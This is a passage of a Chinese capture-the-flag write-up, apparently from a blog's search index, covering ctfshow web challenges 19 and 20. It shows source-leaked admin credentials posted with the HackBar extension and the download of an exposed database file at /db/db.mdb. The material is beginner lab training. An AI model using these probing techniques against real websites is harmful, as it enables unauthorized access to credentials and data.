你赢了，去幺幺零点皮爱吃皮看看  翻译过来就是到110.php看看  在靶场url后面加上110.php得到flag</p><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>查看提示</p><h6 id="-55"><a href="#-55" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171416900.png" style="zoom:200%;" /></h6><p>根据提示右击查看源码</p><h6 id="-56"><a href="#-56" class="headerlink" title=""></a><img src="C:/Users/112/AppData/Roaming/Typora/typora-user-images/image-20220304171427149.png" style="zoom:200%;" /></h6><p>最最最基础的代码审计 哪怕没学过php只懂一点c也能看明白</p><pre class="line-numbers language-none"><code class="language-none">让username&#x3D;admin pazzword&#x3D;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入flag</p><p>来到靶场 f12键 点hackbar(后面有hackbar的安装)</p><p>构造payload</p><h6 id="-57"><a href="#-57" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304171441882.png" style="zoom:150%;" /></h6><p>Load url:加载url 点击后右边输入框里会出来对应的url get传参在这修改或者在浏览器上面的输入框修改</p><p>Post data：点击后下面出现一个输入框 用来post传参时构造payload</p><p>Execute:用来向浏览器发送payload</p><p>得到flag</p><p>Hackbar安装：</p><p>用火狐浏览器 点右上角的三条杠-扩展与主题</p><h6 id="-58"><a href="#-58" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304171454602.png" style="zoom:200%;" /></h6><p>输入框搜hackbar</p><h6 id="-59"><a href="#-59" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304171501993.png" style="zoom:200%;" /></h6><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>查看提示</p><h6 id="-60"><a href="#-60" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304171522367.png" style="zoom:200%;" /></h6><p>提示已经写的的很清楚了</p><h6 id="-61"><a href="#-61" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304171533916.png" style="zoom:200%;" /></h6><p>构造payload  url&#x2F;db&#x2F;db.mdb</p><p>网页提示下载 下载后文本文档打开 我有notepad 直接右击notepad打开ctrl+f查找ctfshow关键字 得到flag</p><h6 id="-62"><a href="#-62" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220304171555801.png" style="zoom:200%;" /></h6>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题记录 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
